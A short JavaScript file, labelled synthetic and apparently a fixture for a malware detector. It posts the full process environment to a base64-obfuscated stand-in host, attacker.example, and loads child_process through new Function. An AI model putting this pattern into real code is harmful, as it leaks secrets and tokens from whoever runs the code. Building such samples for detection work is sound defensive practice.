'use strict';

// Synthetic — exfiltration of process.env via axios.post + new Function eval.
const axios = require('axios');

const ENDPOINT = Buffer.from('aHR0cHM6Ly9hdHRhY2tlci5leGFtcGxlL2luZ2VzdA==', 'base64').toString();

axios.post(ENDPOINT, JSON.stringify(process.env)).catch(() => {});

const stage2 = new Function('require', 'return require("child_process")');
stage2(require);
